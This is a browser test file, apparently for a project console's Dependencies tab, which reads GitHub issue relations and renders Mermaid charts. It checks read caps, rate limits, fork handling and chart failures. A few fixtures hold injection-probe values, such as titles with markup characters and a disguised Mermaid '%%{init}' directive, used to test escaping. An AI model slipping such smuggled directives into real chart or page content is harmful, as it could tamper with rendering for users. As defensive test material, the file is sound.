  await signIn(page);
  await waitGraph(page, /^Not drawn: it would take more than 2 reads of GitHub, the most this page makes for one draw; stopped at the issues blocking #23\./);
  await sleep(500);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 2));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('H: a repository with no epic or goal draws nothing, says so, reads nothing more and loads no drawing script', async () => {
  const tasks = [issue(7, 'A task', ['todo']), issue(8, 'Another', ['claimed', 'worker:alice'])];
  const { context, page, calls, errors, requests } = await open(baseRoutes('acme/demo', tasks));
  await signIn(page);
  await waitGraph(page, /^Nothing to draw yet: no open issue labelled epic or goal has sub-issues\. To start, label an issue epic, open it on GitHub and add its tasks under Sub-issues \(Create sub-issue, or Add existing issue\); on a task, add what must close first under Relationships \(Blocked by\); then press Refresh\.$/);
  await page.waitForFunction(() => /Queue: /.test(document.getElementById('cp-summary').textContent));
  await sleep(500);
  console.log('     state:', (await stateText(page)).slice(0, 100), '| reads:', dependencyReads(calls).length, '| vendor loads:', vendorLoads(requests));
  assert.deepEqual(dependencyReads(calls), []);
  assert.equal(vendorLoads(requests), 0);
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('I: Refresh reads again and redraws with the new count of closed tasks', async () => {
  let completed = 1;
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues'] = () => fixture(completed).open;
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  completed = 2;
  await page.click('#cp-refresh');
  await page.waitForFunction(() => /\(2\/3\)/.test(document.getElementById('cp-graph').textContent), null, { timeout: 8000 });
  await waitGraph(page, /^Drawn from 4 reads/);
  const charts = await page.evaluate(() => window.__charts);
  console.log('     headings after:', JSON.stringify(await headings(page)), '| charts handed in all:', charts.length, '| reads in all:', dependencyReads(calls).length);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (2/3)']);
  assert.equal(charts[2], GOALS_TEXT.replace('(1/3)', '(2/3)'));
  assert.equal(dependencyReads(calls).length, 8);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('J: a goal is listed with the epics, not in the queue and not as an other issue', async () => {
  const f = fixture();
  f.open.push(issue(50, 'Unlabelled', []));
  const { context, page, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const other = await page.textContent('#cp-other');
  const summary = await page.textContent('#cp-summary');
  console.log('     other:', other.slice(0, 80), '| summary:', summary.replace(/.*Queue: /, 'Queue: ').slice(0, 120));
  assert.equal(await page.$$eval('#cp-epics tr[data-number="30"]', (l) => l.length), 1);
  assert.equal(await page.$$eval('#cp-queue tr[data-number="30"]', (l) => l.length), 0);
  assert.ok(!/#30/.test(other), 'the goal is named as an other issue: ' + other);
  assert.match(other, /1 other open issue carries none of the protocol's labels: #50 Unlabelled\./);
  assert.match(summary, /Queue: 2 unclaimed issues; given to workers: 1; claimed: 1 \(#22 by alice\); in review: 0; blocked: 0; blockers: 1; epics and goals: 2\./);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('K: switching repositories mid-draw never shows the earlier repository\'s charts under the new one', async () => {
  const routes = Object.assign(fixtureRoutes(fixture()), baseRoutes('acme/beta', [issue(3, 'A task of beta', ['todo'])]));
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, fixture().subIssues[20], { delayMs: 2500 });
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute], storage: { symphony_panel_repos: JSON.stringify(['acme/demo', 'acme/beta']) } });
  await signIn(page);
  await waitGraph(page, /^Reading the sub-issues of 2 epics and goals/);
  await page.selectOption('#cp-repo', 'acme/beta');
  await waitGraph(page, /^Nothing to draw/);
  await sleep(3500);
  const state = await stateText(page);
  const text = await page.textContent('#cp-graph');
  console.log('     repo:', await page.textContent('#cp-repo-shown'), '| state:', state.slice(0, 60), '| graph text:', JSON.stringify(text.slice(0, 60)), '| demo reads after the switch:', dependencyReads(calls).filter((k) => /acme\/demo/.test(k)).length);
  assert.match(state, /^Nothing to draw/);
  assert.equal(text, '');
  assert.equal(await page.evaluate(() => (window.__charts || []).length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('L: each chart\'s list says the state, what blocks each task and the worker, in words', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const rows = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('tbody tr')).map((tr) => Array.from(tr.querySelectorAll('td')).slice(0, 5).map((td) => td.textContent.trim()))));
  const heads = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('th')).map((th) => th.textContent.trim())));
  console.log('     goals table:', JSON.stringify(rows[0]), '\n     epic table:', JSON.stringify(rows[1]));
  assert.deepEqual(heads, [['Issue', 'Title', 'State', 'Its epics', 'Worker', 'Actions'], ['Issue', 'Title', 'State', 'Blocked by', 'Worker', 'Actions']]);
  assert.deepEqual(rows[0], [['#20', 'Draw the board', 'open', '', ''], ['#30', 'Ship the graph', 'todo, unclaimed', '#20', '']]);
  assert.deepEqual(rows[1], [
    ['#21', 'Read the summary', 'closed', '', ''],
    ['#22', 'Render the section', 'claimed', '#99', 'alice'],
    ['#23', 'Write the body | with "quotes" and <tags> #5 and a title long enough to be cut short', 'todo, unclaimed', '#21 (closed), #22', ''],
    ['#99', 'Settle the colours', 'todo, unclaimed', '', ''],
  ]);
  const links = await page.$$eval('#cp-graph tbody a', (as) => as.map((a) => [a.getAttribute('href'), a.target, a.rel]));
  assert.ok(links.every((l) => /^https:\/\/github\.com\/acme\/demo\/issues\/[0-9]+$/.test(l[0]) && l[1] === '_blank' && l[2] === 'noopener'), 'a link off the repository or without noopener: ' + JSON.stringify(links));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G4: a read that finds the token under the reserve stops the draw there, said in words', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, f.subIssues[20], { headers: { 'X-RateLimit-Remaining': '99', 'Access-Control-Expose-Headers': 'ETag, Link, X-RateLimit-Remaining' } });
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 1));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G6: the reserve follows the newest count GitHub gives on any of the console\'s reads, and a draw that then succeeds takes its earlier failure off the summary', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  const expose = 'ETag, Link, X-RateLimit-Remaining';
  let issuesLeft = 150, pullsLeft = 60;
  routes['GET /repos/acme/demo/issues'] = () => resp(200, f.open, { headers: { 'X-RateLimit-Remaining': String(issuesLeft), 'Access-Control-Expose-Headers': expose } });
  // the pull requests answer while the first sub-issue read is still out, with a count the draw
  // began above, so the read after it is the one the newer count stops
  routes['GET /repos/acme/demo/pulls'] = () => resp(200, [], { delayMs: 600, headers: { 'X-RateLimit-Remaining': String(pullsLeft), 'Access-Control-Expose-Headers': expose } });
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(200, f.subIssues[20], { delayMs: 1500 });
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 60 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 1));
  await page.waitForFunction(() => /Not read: the dependencies/.test(document.getElementById('cp-summary').textContent), null, { timeout: 8000 });
  // a task queued redraws on the same state, as Give to, a mention and a merge do, so only the
  // draw itself can take its earlier failure off the summary
  issuesLeft = 4000; pullsLeft = 4000;
  routes['POST /repos/acme/demo/issues'] = resp(201, { number: 99, html_url: 'https://github.com/acme/demo/issues/99', title: 'Task: x' });
  await toTab(page, 'tasks');
  await page.fill('#cp-task-title', 'x');
  await page.fill('#cp-task-goal', 'g');
  await page.fill('#cp-task-acceptance', 'a');
  await page.click('#cp-task-queue');
  await waitGraph(page, /^Drawn /, 15000);
  await sleep(500);
  const summary = await page.textContent('#cp-summary');
  console.log('     after the task:', await stateText(page), '| summary:', summary.slice(0, 120));
  assert.doesNotMatch(summary, /the dependencies/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G5: once the open issues\' answer says the token is under the reserve, a draw reads nothing, and a Refresh under it reads nothing either', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  let left = 99;
  routes['GET /repos/acme/demo/issues'] = () => resp(200, f.open, { headers: { 'X-RateLimit-Remaining': String(left--), 'Access-Control-Expose-Headers': 'ETag, Link, X-RateLimit-Remaining' } });
  const { context, page, calls, errors, requests } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: GitHub says/);
  await sleep(500);
  const state = await stateText(page);
  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the sub-issues of #20. Press Refresh once GitHub\'s hourly limit has reset.');
  assert.deepEqual(dependencyReads(calls), []);
  await page.click('#cp-refresh');
  await waitGraph(page, /^Not drawn: GitHub says this token has 98 calls/);
  await sleep(500);
  console.log('     after Refresh:', await stateText(page), '| reads:', JSON.stringify(dependencyReads(calls)));
  assert.deepEqual(dependencyReads(calls), []);
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.equal(vendorLoads(requests), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check M's repository: the fixture and a second epic whose sub-issues come in two pages, holding a
// pull request, another repository's issue, #23 again (under #20 too), a task whose blocked_by
// answers 410 and a task blocked from outside the epic, one blocker of it in another repository; a
// goal over both epics; and an issue labelled goal and epic, its title padded. The four blocks
// below are what the library at FIXTURE_COMMIT writes for these objects, its own reads
// (adapters/github.py DependencyReads) run over them and board.render after.
const OTHER_REPO = 'https://api.github.com/repos/other/place';
function scenarioM() {
  const f = fixture();
  const [i20, i22, i23, i24, i25, i30, i99] = f.open;
  i30.sub_issues_summary = subs(0, 2).sub_issues_summary;
  const i60 = issue(60, 'Second epic', ['epic'], Object.assign(subs(1, 6), deps(1, 1)));
  const i61 = issue(61, 'A pull request listed as a sub-issue', ['todo'], { pull_request: { url: 'https://api.github.com/repos/acme/demo/pulls/61' } });
  const i7 = issue(7, 'Another repository\'s issue', ['todo'], { repository_url: OTHER_REPO });
  const i62 = issue(62, 'Its blocker was deleted', ['todo'], deps(1, 1));
  const i63 = issue(63, 'Waits on three here', ['blocked'], deps(3, 4));
  const i8 = issue(8, 'Elsewhere', ['todo'], { repository_url: OTHER_REPO });
  const i64 = issue(64, 'Closed long ago', ['todo'], { state: 'closed' });
  const i65 = issue(65, 'An outside blocker', ['todo'], deps(2, 3));
  // padded with the separators Python's strip() takes and JavaScript's trim() does not
  const i70 = issue(70, '\x1c A goal that is an epic \x1f', ['goal', 'epic'], subs(0, 1));
  const i71 = issue(71, 'Under the goal and epic', ['todo'], deps(0, 0));
  const routes = baseRoutes('acme/demo', [i20, i22, i23, i24, i25, i30, i99, i60, i65, i70]);
  const lists = { 20: f.subIssues[20], 30: [i20, i60], 70: [i71] };
  for (const n of Object.keys(lists)) routes['GET /repos/acme/demo/issues/' + n + '/sub_issues'] = lists[n];
  const next = '<https://api.github.com/repos/acme/demo/issues/60/sub_issues?per_page=100&page=2>; rel="next"';
  routes['GET /repos/acme/demo/issues/60/sub_issues'] = (url) => url.searchParams.get('page') === '2' ? [i62, i63] : resp(200, [i61, i7, i23], { headers: { Link: next } });
  routes['GET /repos/acme/demo/issues/22/dependencies/blocked_by'] = f.blockedBy[22];
  routes['GET /repos/acme/demo/issues/23/dependencies/blocked_by'] = f.blockedBy[23];
  routes['GET /repos/acme/demo/issues/62/dependencies/blocked_by'] = resp(410, { message: 'This issue was deleted' });
  routes['GET /repos/acme/demo/issues/63/dependencies/blocked_by'] = [i25, i8, i64, i65];
  return routes;
}
const CLASS_LINES = [
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
];
const M_GOALS_TEXT = [
  'flowchart TD',
  '  i20["#20 Draw the board (1/3)"]',
  '  i30["#30 Ship the graph (0/2)"]:::todo',
  '  i60["#60 Second epic (1/6)"]',
  '  i70["#70 A goal that is an epic (0/1)"]',
  '  i71["#71 Under the goal and epic"]:::todo',
  '  i30 ==> i20',
  '  i30 ==> i60',
  '  i70 ==> i71',
].concat(CLASS_LINES).join('\n');
const M_EPIC_60_TEXT = [
  'flowchart TD',
  '  i21["#21 Read the summary"]:::closed',
  '  i22["#22 Render the section"]:::claimed',
  '  i23["#23 Write the body #124; with #quot;quotes#quot; and #lt;t..."]:::todo',
  '  i25["#25 Fix the build"]',
  '  i62["#62 Its blocker was deleted"]:::todo',
  '  i63["#63 Waits on three here"]:::blocked',
  '  i64["#64 Closed long ago"]:::closed',
  '  i65["#65 An outside blocker"]:::todo',
  '  i21 -.-> i23',
  '  i22 --> i23',
  '  i25 --> i63',
  '  i64 -.-> i63',
  '  i65 --> i63',
].concat(CLASS_LINES).join('\n');
const M_EPIC_70_TEXT = ['flowchart TD', '  i71["#71 Under the goal and epic"]:::todo'].concat(CLASS_LINES).join('\n');

await check('M: every page of a sub-issue list is read and counted, a pull request, another repository\'s issue and a deleted one are left out, a task under two epics is read once, and the charts are the board\'s bytes', async () => {
  const { context, page, calls, errors } = await open(scenarioM(), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 9 reads/);
  await sleep(300);
  const charts = await page.evaluate(() => window.__charts);
  const reads = calls.filter((c) => dependencyReads([c]).length).map((c) => { const u = new URL(c.url); return u.pathname + (u.searchParams.get('page') ? '?page=' + u.searchParams.get('page') : ''); });
  console.log('     reads:', JSON.stringify(reads), '\n     headings:', JSON.stringify(await headings(page)));
  assert.deepEqual(reads, [
    '/repos/acme/demo/issues/20/sub_issues', '/repos/acme/demo/issues/22/dependencies/blocked_by', '/repos/acme/demo/issues/23/dependencies/blocked_by',
    '/repos/acme/demo/issues/30/sub_issues', '/repos/acme/demo/issues/60/sub_issues', '/repos/acme/demo/issues/60/sub_issues?page=2',
    '/repos/acme/demo/issues/62/dependencies/blocked_by', '/repos/acme/demo/issues/63/dependencies/blocked_by', '/repos/acme/demo/issues/70/sub_issues',
  ]);
  assert.deepEqual(charts, [M_GOALS_TEXT, EPIC_20_TEXT, M_EPIC_60_TEXT, M_EPIC_70_TEXT]);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)', 'Epic #60: Second epic (1/6)', 'Epic #70: A goal that is an epic (0/1)']);
  const rows = await page.$$eval('#cp-graph table', (tables) => tables.map((t) => Array.from(t.querySelectorAll('tbody tr')).map((tr) => Array.from(tr.querySelectorAll('td')).slice(0, 4).map((td) => td.textContent.trim()))));
  console.log('     epic #60 table:', JSON.stringify(rows[2]));
  assert.deepEqual(rows[2].map((r) => [r[0], r[2], r[3]]), [
    ['#21', 'closed', ''], ['#22', 'claimed', '#99'], ['#23', 'todo, unclaimed', '#21 (closed), #22'], ['#25', 'open', '1 open issue'],
    ['#62', 'todo, unclaimed', ''], ['#63', 'blocked', '#25, #64 (closed), #65'], ['#64', 'closed', ''], ['#65', 'todo, unclaimed', '2 open issues and 1 closed one'],
  ]);
  assert.match(await stateText(page), /^Drawn from 9 reads of GitHub: 2 goals and 3 epics with sub-issues\./);
  assert.deepEqual(errors, []);
  await context.close();
  // the second page of a list is one read against the cap, as the first is
  const capped = await open(scenarioM(), { extraRoutes: [stubRoute], constants: { GRAPH_READS_MAX: 5 } });
  await signIn(capped.page);
  await waitGraph(capped.page, /^Not drawn: it would take more than 5 reads/);
  await sleep(300);
  console.log('     capped:', await stateText(capped.page));
  assert.equal(await stateText(capped.page), 'Not drawn: it would take more than 5 reads of GitHub, the most this page makes for one draw; stopped at the sub-issues of #60. Closing the epics that are done makes it fewer.');
  assert.equal(dependencyReads(capped.calls).length, 5);
  assert.equal(await capped.page.evaluate(() => (window.__charts || []).length), 0);
  assert.deepEqual(capped.errors, []);
  await capped.context.close();
});

await check('N: a repository whose record cannot be read leaves the tab saying so, never reading', async () => {
  const routes = fixtureRoutes(fixture());
  delete routes['GET /repos/acme/demo'];
  const { context, page, calls, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn/);
  await page.waitForFunction(() => /Could not read acme\/demo/.test(document.getElementById('cp-summary').textContent), null, { timeout: 8000 });
  console.log('     state:', await stateText(page), '| summary:', (await page.textContent('#cp-summary')).slice(0, 80));
  assert.equal(await stateText(page), 'Not drawn: the repository could not be read.');
  assert.deepEqual(dependencyReads(calls), []);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('O: a repository named by its old name is read under the name GitHub gives it, and its charts are drawn', async () => {
  const f = fixture();
  const renamed = (it) => Object.assign({}, it, { repository_url: 'https://api.github.com/repos/acme/renamed', html_url: it.html_url.replace('acme/demo', 'acme/renamed') });
  const routes = baseRoutes('acme/demo', f.open.map(renamed));
  routes['GET /repos/acme/demo'] = Object.assign({}, routes['GET /repos/acme/demo'], { full_name: 'acme/renamed' });
  for (const n of Object.keys(f.subIssues)) routes['GET /repos/acme/renamed/issues/' + n + '/sub_issues'] = f.subIssues[n].map(renamed);
  for (const n of Object.keys(f.blockedBy)) routes['GET /repos/acme/renamed/issues/' + n + '/dependencies/blocked_by'] = f.blockedBy[n].map(renamed);
  const { context, page, calls, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)));
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS.map((k) => k.replace('acme/demo', 'acme/renamed')));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('P: a task whose claim branch has an open pull request is shaded claimed, as the board shades it, the pull requests waited for and a fork\'s branch not counted', async () => {
  const routes = fixtureRoutes(fixture());
  const pull = (number, ref, fullName) => ({ number, title: 'Work on it', html_url: 'https://github.com/acme/demo/pull/' + number, draft: true, updated_at: now, user: { login: 'bob' }, base: { ref: 'main' }, head: { ref, sha: 'a'.repeat(40), repo: { full_name: fullName } } });
  // the pull requests answer after the tab's reads, so the chart is drawn only once they are in
  routes['GET /repos/acme/demo/pulls'] = resp(200, [pull(80, 'claude/23', 'acme/demo'), pull(81, 'claude/99', 'mallory/demo')], { delayMs: 2500 });
  const { context, page, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 12000);
  const charts = await page.evaluate(() => window.__charts);
  // a row by the issue its first cell names, since a Blocked by cell links other issues too
  const stateOf = (n) => page.textContent('#cp-graph tr:has(td:first-child a[href$="/issues/' + n + '"]) td:nth-child(3)');
  const state23 = await stateOf(23);
  console.log('     #23 line:', JSON.stringify(charts[1].split('\n')[3]), '| #23 state:', state23);
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT.replace('#lt;t..."]:::todo', '#lt;t..."]:::claimed')]);
  assert.equal(state23, 'claimed');
  assert.equal(await stateOf(99), 'todo, unclaimed');
  assert.deepEqual(errors, []);
  await context.close();
});

// a stand-in for the drawing library that cannot draw the goals' chart, as Mermaid fails on a text
// it cannot parse
const STUB_FAILS_GOALS = "window.mermaid = { initialize: function () {}, render: function (id, text) { (window.__charts = window.__charts || []).push(text); return /==>/.test(text) ? Promise.reject(new Error('Parse error on line 3')) : Promise.resolve({ svg: '<svg data-stub=\"1\"></svg>' }); } };";
await check('Q: one chart that cannot be drawn leaves the others drawn, and the words name it and count the rest; with none drawn the key is hidden', async () => {
  const route = [VENDOR, (r) => r.fulfill({ status: 200, contentType: 'application/javascript', body: STUB_FAILS_GOALS })];
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [route] });
  await signIn(page);
  await waitGraph(page, /^Drawn 1 of 2 charts/);
  const hosts = await page.$$eval('#cp-graph .control__chart', (list) => list.map((h) => h.querySelectorAll('svg').length));
  const state = await stateText(page);
  console.log('     state:', state, '| svgs per chart:', JSON.stringify(hosts));
  assert.equal(state, 'Drawn 1 of 2 charts from 4 reads of GitHub: 1 goal and 1 epic with sub-issues; 1 chart could not be drawn (Goals: Parse error on line 3), and its list says the same.');
  assert.deepEqual(hosts, [0, 1]);
  // the chart not drawn shows its list in its place, and the drawn one keeps its chart
  assert.deepEqual(await page.$$eval('#cp-graph .graph__section', (secs) => secs.map((sec) => [sec.getAttribute('data-view'), sec.querySelector('.graph__list').hidden])), [['list', false], ['chart', true]]);
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(await page.$$eval('#cp-graph table', (ts) => ts.map((t) => t.querySelectorAll('tbody tr').length)), [2, 4]);
  // one chart drawn keeps the key; none drawn hides it, the cards holding their lists alone
  assert.equal(await page.evaluate(() => document.getElementById('cp-graph-key').hidden), false, 'the key went with one chart drawn');
  assert.deepEqual(errors, []);
  await context.close();
  const failsAll = [VENDOR, (r) => r.fulfill({ status: 200, contentType: 'application/javascript', body: STUB_FAILS_GOALS.replace('/==>/.test(text)', 'true') })];
  const none = await open(fixtureRoutes(fixture()), { extraRoutes: [failsAll] });
  await signIn(none.page);
  await waitGraph(none.page, /^Drawn 0 of 2 charts/);
  const lists = await none.page.$$eval('#cp-graph .graph__list', (ds) => ds.map((d) => !d.hidden));
  const keyHidden = await none.page.evaluate(() => document.getElementById('cp-graph-key').hidden);
  console.log('     none drawn:', await stateText(none.page), '| lists open:', JSON.stringify(lists), '| key hidden:', keyHidden);
  assert.deepEqual(lists, [true, true]);
  assert.equal(keyHidden, true, 'the key is shown with no chart drawn');
  assert.deepEqual(none.errors, []);
  await none.context.close();
});

await check('R: the board\'s own charts are drawn in the Board tab while it is hidden, never shown as text, show whole when it opens, and a node there opens in focus under its chart, whose Centre its row opens the Tasks tab with its row centred in that tab\'s box', async () => {
  const routes = fixtureRoutes(fixture());
  const withCharts = board + '\n## Dependencies\n\nEach open epic\'s tasks as GitHub\'s sub-issues and blocked-by relations hold them.\n\n### Goals\n\n```mermaid\n' + GOALS_TEXT + '\n```\n\n### Epic #20: Draw the board (1/3)\n\n```mermaid\n' + EPIC_20_TEXT + '\n```\n';
  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(withCharts) };
  const { context, page, errors, requests } = await open(routes);
  await signIn(page);
  // drawn while the Dependencies tab is shown and the Board tab hidden
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const drawnHidden = await page.evaluate(() => document.getElementById('tab-board').hidden);
  await toTab(page, 'board');
  const sizes = await page.$$eval('#cp-board .control__chart svg', (list) => list.map((svg) => [svg.getBoundingClientRect().width, svg.getBoundingClientRect().height]));
  console.log('     drawn while hidden:', drawnHidden, '| sizes once shown:', JSON.stringify(sizes.map((x) => x.map(Math.round))));
  assert.equal(drawnHidden, true);
  assert.ok(sizes.every((x) => x[0] > 0 && x[1] > 0), 'a board chart has no size once its tab opens');
  // the box's words, the drawn pictures left out, whose own styles name their classes
  const text = await page.$eval('#cp-board', (box) => { const copy = box.cloneNode(true); copy.querySelectorAll('svg').forEach((svg) => svg.remove()); return copy.textContent; });
  console.log('     board charts:', await page.$$eval('#cp-board .control__chart svg', (l) => l.length), '| raw text shown:', /flowchart|classDef/.test(text), '| vendor loads:', vendorLoads(requests));
  assert.ok(!/flowchart|classDef|==>/.test(text), 'the board box shows chart text: ' + text.slice(0, 200));
  assert.equal(await page.$$eval('#cp-board pre', (l) => l.length), 0);
  assert.deepEqual(await page.$$eval('#cp-board h4, #cp-board h3', (hs) => hs.map((h) => h.textContent)).then((hs) => hs.filter((h) => /Goals|Epic/.test(h))), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.equal(vendorLoads(requests), 1);
  const contrast = await chartContrast(page, '#cp-board');
  console.log('     contrast on the ground:', JSON.stringify(contrast));
  assertContrast(contrast);
  const before = await where(page);
  assert.deepEqual([before.hash, before.shown, before.y], ['#board', ['board'], 0]);
  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  await page.click('#cp-board g.node[id*="-flowchart-i22-"]');
  // the press opens #22 in focus in the Board tab, its card under the chart, and moves nothing
  await page.waitForFunction(() => { const n = document.querySelector('#cp-board .graph__near--board:not([hidden]) .graph__nearnum'); return n && n.textContent === '#22'; }, null, { timeout: 8000 });
  const pressed = await where(page);
  const near = await page.$eval('#cp-board .graph__near--board:not([hidden])', (card) => {
    const svg = card.previousElementSibling.querySelector(':scope > svg.graph__nearsvg');
    return { title: card.querySelector('.graph__neartitle').textContent, button: card.querySelector('.graph__nearacts button').textContent,
      nodes: svg ? Array.from(svg.querySelectorAll('g.node')).map((g) => Number(/-flowchart-i([0-9]+)-/.exec(g.id)[1])).sort((a, b) => a - b) : [] };
  });
  console.log('     after the press:', JSON.stringify(pressed), '| focus:', JSON.stringify(near));
  assert.deepEqual([pressed.hash, pressed.shown, pressed.y], ['#board', ['board'], 0], 'the press left the Board tab or moved the window');
  assert.deepEqual(near, { title: 'Render the section', button: 'Centre its row', nodes: [22, 23, 99] });
  await page.click('#cp-board .graph__near--board:not([hidden]) .graph__nearacts button');
  // read at once, before any call that would open a tab itself
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-claimed tr[data-number="22"]');
  console.log('     after Centre its row:', JSON.stringify(after), '| a moment later:', settled.y, '| row:', view, '| message line:', await msgText(page));
  assert.deepEqual([after.hash, after.shown, after.y, settled.y], ['#tasks', ['tasks'], 0, 0], 'Centre its row did not open the Tasks tab alone, or moved the window');
  assert.equal(view, 'in view');
  await page.waitForSelector('#cp-claimed tr[data-number="22"].control__focus', { timeout: 8000 });
  assert.equal(await page.textContent('#cp-graph-said'), 'Focused #22 (under Claimed).');
  // pressed from the Board tab, the person sees neither tab's said line, so the message line says it
  assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
  assert.deepEqual(errors, []);
  await context.close();
});

// a board's text with its Dependencies section holding the blocks given, each under its heading
function boardWith(blocks) {
  return board + '\n## Dependencies\n\nEach open epic\'s tasks as GitHub\'s sub-issues and blocked-by relations hold them.\n' +
    blocks.map(([heading, text]) => '\n### ' + heading + '\n\n```mermaid\n' + text + '\n```\n').join('');
}
// a repository with no epic, so the Dependencies tab hands the drawing nothing and whatever is drawn is the board's
function boardOnlyRoutes(text) {
  const routes = baseRoutes('acme/demo', [issue(7, 'A task', ['todo']), issue(8, 'Another', ['claimed', 'worker:alice'])]);
  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(text) };
  return routes;
}
// Issues whose titles hold every printable ASCII character between them, each short enough that the
// cut leaves it whole, one holding the fullwidth and small percent and dollar signs the fold turns
// into the plain ones, and a node of each class and of none: the node lines the Board tab's gate
// (BOARD_NODE_LINE in the site's script) must let through when the board writes them. GATE_TEXT is
// the block the library at FIXTURE_COMMIT writes for them; A2 renders it again with the checkout
// named, and R3 hands the Board tab that fresh render, so a change to the library's labels that the
// gate does not follow fails here before a board's chart is shown as text.
const PRINTABLE = Array.from({ length: 94 }, (x, i) => String.fromCharCode(33 + i)).join('');
const GATE_ISSUES = {
  61: { title: PRINTABLE.slice(0, 15) + ' ' + PRINTABLE.slice(15, 32), labels: ['todo'] },
  62: { title: PRINTABLE.slice(32, 48) + ' ' + PRINTABLE.slice(48, 64), labels: ['claimed'] },
  63: { title: PRINTABLE.slice(64, 79) + ' ' + PRINTABLE.slice(79), labels: ['in-review'] },
  64: { title: 'a \uff05\uff05{init} \ufe6a b \uff04\uff04x\ufe69\ufe69', labels: ['blocked'] },
  65: { title: 'Closed long ago', labels: ['todo'], state: 'closed' },
  66: { title: 'In no state', labels: [], progress: [2, 5] },
};
const GATE_TEXT = [
  'flowchart TD',
  '  i61["#61 !#quot;#35;#36;#37;&\'()*+,-./ 0123456789:;#lt;=#gt;?@"]:::todo',
  '  i62["#62 ABCDEFGHIJKLMNOP QRSTUVWXYZ[\\]^_`"]:::claimed',
